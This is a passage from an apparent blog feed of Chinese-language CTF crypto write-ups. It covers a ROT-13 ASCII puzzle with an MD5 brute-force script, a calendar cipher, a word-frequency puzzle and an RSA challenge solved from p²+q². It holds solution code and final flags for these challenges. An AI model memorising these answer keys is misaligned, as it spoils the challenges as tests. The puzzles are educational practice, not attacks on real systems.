class="line">flag&#123;402780ce-1c06-4173-9c4b-6af435651a95&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>BUUCTF crypto 3</title>
      <link href="/ctf-crypto-buuctf-3/"/>
      <url>/ctf-crypto-buuctf-3/</url>
      
        <content type="html"><![CDATA[<h3 id="rot"><a class="markdownIt-Anchor" href="#rot"></a> rot</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">破解下面的密文：</span><br><span class="line"></span><br><span class="line">83 89 78 84 45 86 96 45 115 121 110 116 136 132 132 132 108 128 117 118 134 110 123 111 110 127 108 112 124 122 108 118 128 108 131 114 127 134 108 116 124 124 113 108 76 76 76 76 138 23 90 81 66 71 64 69 114 65 112 64 66 63 69 61 70 114 62 66 61 62 69 67 70 63 61 110 110 112 64 68 62 70 61 112 111 112</span><br><span class="line"></span><br><span class="line">flag格式flag&#123;&#125;</span><br></pre></td></tr></table></figure><p>看到題目，先看前面幾個字，83在ascii當中是s，rot13後是f，以rot13對每個字元進行解碼。</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line">s = <span class="string">&#x27;83 89 78 84 45 86 96 45 115 121 110 116 136 132 132 132 108 128 117 118 134 110 123 111 110 127 108 112 124 122 108 118 128 108 131 114 127 134 108 116 124 124 113 108 76 76 76 76 138 23 90 81 66 71 64 69 114 65 112 64 66 63 69 61 70 114 62 66 61 62 69 67 70 63 61 110 110 112 64 68 62 70 61 112 111 112&#x27;</span></span><br><span class="line">l = s.split(<span class="string">&quot; &quot;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> l:</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">chr</span>(<span class="built_in">int</span>(i)-<span class="number">13</span>),end=<span class="string">&#x27;&#x27;</span>)</span><br></pre></td></tr></table></figure><p>初步解碼之後得到以下訊息</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">FLAG IS flag&#123;www_shiyanbar_com_is_very_good_????&#125;</span><br><span class="line">MD5:38e4c352809e150186920aac37190cbc</span><br></pre></td></tr></table></figure><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line">demo = <span class="string">&#x27;flag&#123;www_shiyanbar_com_is_very_good_&#x27;</span></span><br><span class="line">md5 = <span class="string">&#x27;38e4c352809e150186920aac37190cbc&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>, <span class="number">126</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>, <span class="number">126</span>):</span><br><span class="line">        <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>, <span class="number">126</span>):</span><br><span class="line">            <span class="keyword">for</span> m <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>, <span class="number">126</span>):</span><br><span class="line">                tmp = demo + <span class="built_in">chr</span>(i) + <span class="built_in">chr</span>(j) + <span class="built_in">chr</span>(k) + <span class="built_in">chr</span>(m) + <span class="string">&#x27;&#125;&#x27;</span></span><br><span class="line">                <span class="built_in">hash</span> = hashlib.md5(tmp.encode(<span class="string">&#x27;utf8&#x27;</span>)).hexdigest()</span><br><span class="line">                <span class="keyword">if</span> md5 == <span class="built_in">hash</span>:</span><br><span class="line">                    <span class="built_in">print</span>(tmp)</span><br><span class="line">                    exit()</span><br></pre></td></tr></table></figure><p>進行md5爆破之後，可以解出來flag。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;www_shiyanbar_com_is_very_good_@8Mu&#125;</span><br></pre></td></tr></table></figure><h3 id="npuctf2020这是什么觅"><a class="markdownIt-Anchor" href="#npuctf2020这是什么觅"></a> [NPUCTF2020]这是什么觅🐎</h3><p>下載檔案後打開來看是亂碼，開頭是PK，反射性將副檔名改成zip之後解壓縮。</p><p>解壓縮之後得到下圖。</p><p><img src="flag.jpg" alt="" /></p><p>圖片底部有標註數字。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">F1 W1 S22 S21 T12 S11 W1 S13</span><br></pre></td></tr></table></figure><p>T和S開頭的都有兩個，所以按先後順序有T1=TUE，T2=THU，S1=SAT，S2=SUN。</p><p>對日歷進行查表之後發現得到數字。</p><table><thead><tr><th>密文</th><th>解密後數字</th><th>對應字母</th></tr></thead><tbody><tr><td>F1</td><td>3</td><td>c</td></tr><tr><td>W1</td><td>1</td><td>a</td></tr><tr><td>S22</td><td>12</td><td>l</td></tr><tr><td>S21</td><td>5</td><td>e</td></tr><tr><td>T12</td><td>14</td><td>n</td></tr><tr><td>S11</td><td>4</td><td>d</td></tr><tr><td>W1</td><td>1</td><td>a</td></tr><tr><td>S13</td><td>18</td><td>r</td></tr></tbody></table><p>解出flag為calendar</p><h3 id="浪里淘沙"><a class="markdownIt-Anchor" href="#浪里淘沙"></a> 浪里淘沙</h3><p>提示: 我有密集恐懼症，所以大家自求多福吧，把獲得的單詞連在一起提交即可。（我這裡有一串數字：4，8，11，15，16）</p><p>題目:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">tonightsuccessnoticenoticewewesuccesstonightweexamplecryptoshouldwebackspacetonightbackspaceexamplelearnwesublimlearnbackspacetheshouldwelearnfoundsublimsystemexamplesublimfoundlearnshouldmorningsublimsystemuserlearnthecryptomorningexamplenoticetonightlearntonightlearntonightsublimenterusermorningfoundtonightweenterfoundnoticethecryptomorningthebackspacelearntonightlearnsublimtonightlearnfoundenterfoundsuccesstonightsuccessuserfoundmorningtonighttheshouldsublimentertonightenterbackspacelearnexamplenoticeexamplefoundsystemsuccesssublimsuccessshouldtonightcryptowelearncryptofoundshouldsublimsublimweentertonightsuccessshouldentertheentercryptouserbackspaceshouldentersystemsuccesssystementerfoundenterlearnexampletonightnoticemorningusertonightlearnmorningtonightfoundfoundsuccessnoticesystementerlearnexamplebackspaceshouldcryptocryptosublimweexampletonighttheshouldthemorningbackspacelearntonightsystemsuccesssuccessbackspacemorningnoticeuserfoundfoundtonightmorningenterenterthefoundbackspacelearnenterentershouldthesystemfounduserlearnlearnsystemnoticetonighttheshouldlearnuserbackspaceweusernoticeshouldthewefoundsystemwecryptocryptowethebackspacesystementershouldtonightsystemnoticemorningsystemweentermorningfoundsuccessusertonightsuccesstonightbackspaceshouldweenterthewesystemusernoticesystemthelearnexamplelearnfoundlearnnoticeexamplesystemthecryptocryptolearnsystemthecryptoenterlearnexamplemorningmorningweenterentersuccessexampleuserthebackspacenoticesublimenterbackspacesuccessbackspacethesublimexamplesystemtheexamplecryptolearnuserexamplelearnsystemusersuccessenterentersuccesstheuserbackspacelearnsuccessbackspacethesublimshouldwebackspaceexamplesuccesssuccesstonightweusershouldsuccessmorningcryptomorningfoundbackspacesublimshouldentershouldnoticesuccessmorningsuccessexamplelearnshouldsublimlearntonightshoulduserbackspacesublimlearncryptosuccessenternoticetonightmorningtonightwesuccessweuserbackspaceexamplewesystemnoticemorningsystemmorningcryptolearnsystemthethefoundcryptouserlearnusersystemwemorningenterexampleshouldlearncryptofoundenterbackspacelearnenterenterbackspaceshouldbackspacetheshouldthesystemshouldshouldsuccessmorningthefoundsystementersystemtonightcryptowelearnexampleexamplesystementerbackspaceshouldtheentersublimtonightfoundfoundsuccesssuccesssystemsublimcryptoshouldentersublimmorninglearnfoundtonightcryptobackspacesuccesscryptowebackspacefoundshouldnoticeshouldmorningnoticesystemcryptosystemlearnsystemnoticemorningsystementerwemorninglearnsuccessfoundwesuccesswetheusercryptousernoticebackspacesuccessshouldtonightmorningentermorninguserenternoticefoundmorningwetonightsystemthecryptotonightcryptosystemuserthefoundexampletonightusersystemcryptosublimmorninguserthefoundbackspaceshouldsuccesscryptotonightsystemnoticebackspaceusershouldenterthecryptomorningwesublimnoticesuccessnoticeusersuccesstonightlearnweuserenterfounduserexampleshouldshouldtonightwelearnthenoticethewefoundmorningexampleshouldexamplethesuccessnoticeenterfoundthecryptonoticeuserlearnuserweenterfoundmorningsystemweexamplenoticethebackspaceexamplesublimtheusermorningtonightthesuccesscryptosuccessusersuccesstonighttonightwelearnenterenterthemorningentersystemcryptobackspacemorningsystemexamplecryptouserexamplelearnsublimsuccessusersystemfoundmorningshouldcryptotonightsublimtheexamplemorningsystemuserexampleweexamplenoticesuccesssublimnoticecryptoshouldbackspaceshouldthetonightfoundsublimbackspacebackspacetonightshouldbackspacesuccesstonightbackspacesuccessmorningsystemcryptobackspaceentertonighttonightnoticelearnshoulduserfoundexamplesystemthesuccessweusertonightcryptousernoticeenternoticebackspaceusersystemfoundusernoticeshouldlearnuserfoundexampleusermorningshouldsuccessmorningmorningexampleexamplefoundsublimfoundenterbackspacenoticelearnfoundmorningcryptonoticecryptoshouldweshouldtonightcryptobackspacesublimcryptosublimenterentersublimentercryptonoticethethesublimexampleenterentershouldlearncryptoentershouldmorninglearnnoticeuserexamplesublimtonightshouldfoundtonightsuccessshouldmorningfoundtheweuserlearnsublimsystembackspacecryptotheusertonightcryptosublimmorningmorningexamplenoticetheenterlearnshouldmorningsublimfoundtonightsublimsublimexamplefounduserexamplethefoundwemorningnoticefoundcryptosuccesssublimsublimexamplethesuccessexamplenoticesuccessbackspacesublimlearnuserexamplesuccesssuccesssystemsuccessmorningmorninglearnexamplemorningtonightfoundbackspaceenternoticemorningentersuccessmorningusermorningbackspacelearncryptoenteruserenteruserthetonighttonightsuccesslearnenterfoundsuccesssystemfoundbackspaceenterlearnsystemsublimcryptoentermorningwetonightshouldlearnenterfoundcryptonoticelearnlearnshouldfoundsuccessexampletonightthesuccessfoundusertonightenterfoundsuccessshouldmorningusernoticemorningsystemsystemsuccessshouldwelearnenterfoundexamplewethefoundweshouldsystemsystemmorningmorningbackspaceshouldentersublimentertonightsuccesssystemsystemcryptousershouldsublimfoundwetonightnoticeexamplewewesuccessfoundusertonightfoundsystemexamplecryptofoundshouldshouldsuccessenterbackspaceexampletonightthelearnnoticeuserlearnsystemsublimfoundlearnsuccesssystemshouldsublimnoticelearnsystemnoticetonightexamplefoundusernoticeenterlearnnoticecryptousersystemmorningthewesystemfoundfoundshouldsystementerenterbackspacesystemsublimcryptousermorninglearnlearntonightsublimlearnenterenterbackspacesystemuserusercryptoentershouldtheusersublimnoticeexamplemorningexamplesublimsublimbackspacesystemexampleshouldsublimlearnfoundenterbackspacelearnmorningmorningfoundthetonightmorningnoticeenterlearnusersystemtonightbackspaceexamplelearntonightbackspaceweshouldcryptosuccessbackspaceexamplesuccesstheshouldmorninguserbackspacelearnthetheshouldcryptocryptotonightbackspacecryptocryptobackspacebackspacenoticeusertonightentermorningfoundweenterexampleenterfoundusersublimsystemtheexampleexamplesystemsuccessusersublimentermorningbackspacesystemfoundlearnsystemshouldsublimsublimentershouldtheusershouldexampleexampleshouldsuccesswelearnfoundsublimshoulduserweentertonightwenoticesublimsystemlearnshouldfoundsuccessuserentersuccessmorningcryptoenteruserfoundexampletonightlearnexampleexamplefoundlearnsuccesssystembackspacecryptonoticethefoundbackspacelearncryptothelearnlearnexamplesuccessnoticenoticesystemmorningcryptotonightnoticenoticeentersuccesscryptoenterbackspacesublimexampleenterfoundtonightcryptotonightsublimnoticesuccesssublimtheentertonighttheshouldthefoundsystemtonightuserbackspacesuccessshouldwebackspacenoticebackspacebackspacenoticewecryptobackspacebackspaceusertonightlearnsuccessmorningusertonightsuccessshouldbackspacecryptoenterentershouldsublimsystemexamplemorningcryptonoticethesuccessthebackspacenoticelearnsublimlearnsuccesscryptothesuccessenternoticecryptosystemsublimsuccesswebackspaceuserenterlearnuserwewemorningsuccesslearncryptobackspacewecryptosystemlearnenterenteruserexamplefoundsystemcryptousernoticefoundusersublimbackspacewesublimnoticemorningshouldexamplenoticecryptoshouldtonightmorningthefoundsystementerentersystemthecryptobackspacesublimlearnsuccessmorningsublimsystemcryptousersublimwesuccessmorningsublimbackspacecryptobackspacesublimthelearnsuccesssublimlearncryptoweweexamplecryptowenoticelearnfoundbackspacesystemsystemexampleshouldlearnsuccesssublimcryptobackspacetonightbackspacemorningmorningnoticeshouldnoticefoundthetheshouldtheshouldfoundfoundcryptosuccessbackspacesuccessshouldweenternoticeweweshouldmorningfoundusersuccessbackspacewenoticeusersuccessenterenterexamplelearnfoundwetonightusercryptothesublimsublimtonightsuccesslearnbackspacetonightentertonightthesublimnoticewefoundcryptobackspaceenterenterlearnlearntonightexamplesystementersublimnoticecryptoshoulduseruserbackspaceuserwesublimmorningwesystemshouldtonighttheusershouldnoticefoundusernoticeentersublimwethewefoundfoundlearnfoundwecryptosystemexamplemorningcryptocryptosublimtheexamplenoticefoundlearnwelearnmorningtheenterthesystemsublimtonightsuccesssystemlearnshouldenterbackspaceentersuccesssuccessbackspaceexamplenoticeentershouldsublimlearnbackspacetheshouldexamplelearnsystemusersublimbackspacebackspacesuccesswelearntonightexamplewecryptoenterwesystemsystemsublimexamplecryptolearnmorningsublimfoundsublimfoundbackspacefoundtonighttonightnoticesuccesssuccessexampleusersuccesstonightsublimcryptosystemweenterexamplesystemthethenoticesublimtonightbackspacenoticesystemexamplethesuccesstonightmorningsuccesstonightwenoticesublimtonightwelearntonightmorningsublimbackspaceenterthetonightenterwecryptofoundtheenternoticebackspacesuccesswesystemuserexamplebackspaceentersuccesstonightsublimwemorningsuccesssuccesswesublimsuccessnoticesublimfoundlearnlearnweexamplecryptonoticelearnweusershoulduserfoundcryptolearnfoundmorningtonightmorningmorningnoticewecryptowewesuccessfoundsublimweuserentershouldshouldshouldsublimbackspacetonightenterwesublimsuccessshouldfoundthethetonightwecryptoweenterfoundcryptoshouldcryptouseruserfoundentersublimsublimthelearntheshouldnoticebackspacefoundsuccessshouldtonightentermorningsystemmorningtonightwenoticelearnbackspaceexampleusershouldnoticesublimsublimexamplethesuccessnoticesystemmorningnoticecryptosystemsublimcryptosystemsuccessshouldmorningbackspaceshouldmorninglearnnoticenoticeshouldthewewesublimsublimnoticeusersuccessentersystemfoundshouldshouldcryptobackspaceusermorningsystemshouldshouldtonightwesublimuserfoundlearnbackspacethetonightmorningexampleuserthefoundbackspaceshouldtonightcryptocryptofounduserexamplenoticecryptousernoticethenoticeshouldweshouldfoundwemorningcryptosuccesslearnfoundtonightsublimnoticenoticewefoundwewesuccesssublimsublimcryptoweexampletonightsuccessfoundshouldsuccesstonightbackspacesystemshouldwesystemnoticebackspaceusersystembackspacewenoticelearnnoticenoticesuccesslearntonightuserlearnsuccessbackspacesuccesswesystemusercryptonoticethesystemusernoticewethesuccessweshouldfoundshouldcryptomorningtonightwethewesuccesslearntheshouldweexampletonightsuccessnoticenoticemorningfoundmorningfoundusersublimsystemsuccessbackspacesuccessmorninguserthefoundweexamplemorningsublimlearnfoundfoundnoticemorningshouldweuserwemorningexamplesuccesssuccessfoundthetheshouldweusershouldtheshouldexamplenoticefoundsuccesssystemfoundshouldsublimbackspacetonightshouldsystemtonightsuccesslearntonightsystemsublimsuccesscryptobackspacesystemsublimmorningmorningshouldmorninglearnsuccesslearnmorningusermorninglearnexamplecryptoshouldbackspacesublimshouldfoundbackspacesystemsystemweexamplesystemtonightsublimmorningmorninguserfoundcryptolearnbackspaceshouldbackspacenoticesublimfoundthecryptousershouldsuccesssystemsuccessshouldsystembackspacesublimshouldsublimsystembackspaceexampleshouldbackspacesublimnoticelearnsublimuserbackspaceusersublimsuccesssublimuserusernoticeshouldsuccessnoticenoticelearnexamplesystemweexamplesublimbackspacebackspacecryptoshouldusercryptosublimbackspacesublimshouldsystemnoticenoticethesuccesssuccesslearnsystemsublimwenoticelearnusersublimsystemusernoticeuserthesuccesslearnwelearnwenoticecryptolearncryptonoticenoticebackspacecryptothecryptousercryptobackspacesuccesslearnthesystemsuccessthesystemsystemcryptosuccessbackspacesublimlearnsublimcryptobackspacelearnsublimusersublimexamplecryptosublimsystemnoticecryptocryptousertheusernoticebackspacenoticenoticethecryptocryptosystembackspacesublimbackspacecryptocryptobackspacesystemuserthenoticesystemsystemsystemusernoticethecryptouserusersystemtheusercryptoexamplenoticecryptoexamplenoticetheexampleexamplethecryptotheusernoticetheexampleexamplecryptotheexampleexamplethenoticethecryptocryptoexampletheexamplecryptocryptothenoticeexamplecryptonoticetheexampleexampleexamplecryptocryptoexampleexamplethenoticethecryptothethethethethetheexampleexamplethetheexampletheexampletheexampleexampleexampleexampleexampleexampleexampleexampleexampleexampleexampleexampleexampleexampleexampleexampleexampleexampleexample</span><br></pre></td></tr></table></figure><p>作詞頻分析，找出第4，8，11，15，16頻率高的詞出來。</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line">data=<span class="string">&#x27;&#x27;&#x27;上面那串&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">statistics=&#123;&#125;</span><br><span class="line">frequency=[]</span><br><span class="line">num=[<span class="number">4</span>,<span class="number">8</span>,<span class="number">11</span>,<span class="number">15</span>,<span class="number">16</span>]</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">zipin</span>(<span class="params">lsit</span>):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> lsit:</span><br><span class="line">        statistics.setdefault(data.count(i),<span class="built_in">str</span>(i))</span><br><span class="line">        frequency.append(data.count(i))</span><br><span class="line">    frequency.sort()</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> num:</span><br><span class="line">        <span class="built_in">print</span>(statistics.get(frequency[i-<span class="number">1</span>]),end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span>(statistics)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    letters=[<span class="string">&quot;tonight&quot;</span>,<span class="string">&quot;success&quot;</span>,<span class="string">&quot;notice&quot;</span>,<span class="string">&quot;example&quot;</span>,<span class="string">&quot;should&quot;</span>,<span class="string">&quot;crypto&quot;</span>,<span class="string">&quot;backspace&quot;</span>,<span class="string">&quot;learn&quot;</span>,<span class="string">&quot;found&quot;</span>,<span class="string">&quot;morning&quot;</span>,<span class="string">&quot;we&quot;</span>,<span class="string">&quot;system&quot;</span>,<span class="string">&quot;sublim&quot;</span>,<span class="string">&quot;the&quot;</span>,<span class="string">&quot;user&quot;</span>,<span class="string">&quot;enter&quot;</span>]</span><br><span class="line">    <span class="built_in">print</span>(zipin(letters))</span><br></pre></td></tr></table></figure><p>程式運行結果</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">weshouldlearnthecrypto</span><br><span class="line"></span><br><span class="line">&#123;117: &#x27;tonight&#x27;, 138: &#x27;success&#x27;, 136: &#x27;notice&#x27;, 139: &#x27;example&#x27;, 131: &#x27;should&#x27;, 141: &#x27;crypto&#x27;, 129: &#x27;backspace&#x27;, 134: &#x27;learn&#x27;, 125: &#x27;found&#x27;, 113: &#x27;morning&#x27;, 124: &#x27;we&#x27;, 130: &#x27;system&#x27;, 132: &#x27;sublim&#x27;, 140: &#x27;the&#x27;, 133: &#x27;user&#x27;, 120: &#x27;enter&#x27;&#125;</span><br></pre></td></tr></table></figure><h3 id="bjdctf2020easyrsa"><a class="markdownIt-Anchor" href="#bjdctf2020easyrsa"></a> [BJDCTF2020]easyrsa</h3><p>題目給了一個檔案</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> getPrime,bytes_to_long</span><br><span class="line"><span class="keyword">from</span> sympy <span class="keyword">import</span> Derivative</span><br><span class="line"><span class="keyword">from</span> fractions <span class="keyword">import</span> Fraction</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line"></span><br><span class="line">p=getPrime(<span class="number">1024</span>)</span><br><span class="line">q=getPrime(<span class="number">1024</span>)</span><br><span class="line">e=<span class="number">65537</span></span><br><span class="line">n=p*q</span><br><span class="line">z=Fraction(<span class="number">1</span>,Derivative(arctan(p),p))-Fraction(<span class="number">1</span>,Derivative(arth(q),q))</span><br><span class="line">m=bytes_to_long(flag)</span><br><span class="line">c=<span class="built_in">pow</span>(m,e,n)</span><br><span class="line"><span class="built_in">print</span>(c,z,n)</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">output:</span></span><br><span class="line"><span class="string">7922547866857761459807491502654216283012776177789511549350672958101810281348402284098310147796549430689253803510994877420135537268549410652654479620858691324110367182025648788407041599943091386227543182157746202947099572389676084392706406084307657000104665696654409155006313203957292885743791715198781974205578654792123191584957665293208390453748369182333152809882312453359706147808198922916762773721726681588977103877454119043744889164529383188077499194932909643918696646876907327364751380953182517883134591810800848971719184808713694342985458103006676013451912221080252735948993692674899399826084848622145815461035</span></span><br><span class="line"><span class="string">32115748677623209667471622872185275070257924766015020072805267359839059393284316595882933372289732127274076434587519333300142473010344694803885168557548801202495933226215437763329280242113556524498457559562872900811602056944423967403777623306961880757613246328729616643032628964072931272085866928045973799374711846825157781056965164178505232524245809179235607571567174228822561697888645968559343608375331988097157145264357626738141646556353500994924115875748198318036296898604097000938272195903056733565880150540275369239637793975923329598716003350308259321436752579291000355560431542229699759955141152914708362494482</span></span><br><span class="line"><span class="string">15310745161336895413406690009324766200789179248896951942047235448901612351128459309145825547569298479821101249094161867207686537607047447968708758990950136380924747359052570549594098569970632854351825950729752563502284849263730127586382522703959893392329333760927637353052250274195821469023401443841395096410231843592101426591882573405934188675124326997277775238287928403743324297705151732524641213516306585297722190780088180705070359469719869343939106529204798285957516860774384001892777525916167743272419958572055332232056095979448155082465977781482598371994798871917514767508394730447974770329967681767625495394441</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><p>首先可以依據程式碼推出<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>z</mi><mo>=</mo><msup><mi>p</mi><mn>2</mn></msup><mo>+</mo><msup><mi>q</mi><mn>2</mn></msup></mrow><annotation encoding="application/x-tex">z=p^2+q^2</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.04398em;">z</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.008548em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord mathdefault">p</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1.008548em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03588em;">q</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span></span></span></span>，又有<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>n</mi><mo>=</mo><mi>p</mi><mo>∗</mo><mi>q</mi></mrow><annotation encoding="application/x-tex">n=p*q</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathdefault">n</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.6597200000000001em;vertical-align:-0.19444em;"></span><span class="mord mathdefault">p</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.19444em;"></span><span class="mord mathdefault" style="margin-right:0.03588em;">q</span></span></span></span>，就可以依照<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mo stretchy="false">(</mo><mi>p</mi><mo>+</mo><mi>q</mi><msup><mo stretchy="false">)</mo><mn>2</mn></msup><mo>=</mo><msup><mi>p</mi><mn>2</mn></msup><mo>+</mo><mn>2</mn><mi>p</mi><mi>q</mi><mo>+</mo><msup><mi>q</mi><mn>2</mn></msup></mrow><annotation encoding="application/x-tex">(p+q)^2=p^2+2pq+q^2</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord mathdefault">p</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1.064108em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.03588em;">q</span><span class="mclose"><span class="mclose">)</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.008548em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord mathdefault">p</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.8388800000000001em;vertical-align:-0.19444em;"></span><span class="mord">2</span><span class="mord mathdefault">p</span><span class="mord mathdefault" style="margin-right:0.03588em;">q</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1.008548em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03588em;">q</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span></span></span></span>解出p和q。</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">c = mpz(<span class="number">7922547866857761459807491502654216283012776177789511549350672958101810281348402284098310147796549430689253803510994877420135537268549410652654479620858691324110367182025648788407041599943091386227543182157746202947099572389676084392706406084307657000104665696654409155006313203957292885743791715198781974205578654792123191584957665293208390453748369182333152809882312453359706147808198922916762773721726681588977103877454119043744889164529383188077499194932909643918696646876907327364751380953182517883134591810800848971719184808713694342985458103006676013451912221080252735948993692674899399826084848622145815461035</span>)</span><br><span class="line">z = mpz(<span class="number">32115748677623209667471622872185275070257924766015020072805267359839059393284316595882933372289732127274076434587519333300142473010344694803885168557548801202495933226215437763329280242113556524498457559562872900811602056944423967403777623306961880757613246328729616643032628964072931272085866928045973799374711846825157781056965164178505232524245809179235607571567174228822561697888645968559343608375331988097157145264357626738141646556353500994924115875748198318036296898604097000938272195903056733565880150540275369239637793975923329598716003350308259321436752579291000355560431542229699759955141152914708362494482</span>)</span><br><span class="line">n = mpz(<span class="number">15310745161336895413406690009324766200789179248896951942047235448901612351128459309145825547569298479821101249094161867207686537607047447968708758990950136380924747359052570549594098569970632854351825950729752563502284849263730127586382522703959893392329333760927637353052250274195821469023401443841395096410231843592101426591882573405934188675124326997277775238287928403743324297705151732524641213516306585297722190780088180705070359469719869343939106529204798285957516860774384001892777525916167743272419958572055332232056095979448155082465977781482598371994798871917514767508394730447974770329967681767625495394441</span>)</span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line"></span><br><span class="line">pqplus = iroot(z + <span class="number">2</span> * n, <span class="number">2</span>)[<span class="number">0</span>]</span><br><span class="line">pqminus = iroot(z - <span class="number">2</span> * n, <span class="number">2</span>)[<span class="number">0</span>]</span><br><span class="line">p = (pqplus + pqminus) // <span class="number">2</span></span><br><span class="line">q = (pqplus - pqminus) // <span class="number">2</span></span><br><span class="line"></span><br><span class="line">phi = (p - <span class="number">1</span>) * (q - <span class="number">1</span>)</span><br><span class="line">d = invert(e, phi)</span><br><span class="line">m = <span class="built_in">pow</span>(c, d, n)</span><br><span class="line"></span><br><span class="line">flag = long_to_bytes(m)</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure><p>得到 b’BJD{Advanced_mathematics_is_too_hard!!!}’</p><h3 id="yxx"><a class="markdownIt-Anchor" href="#yxx"></a> 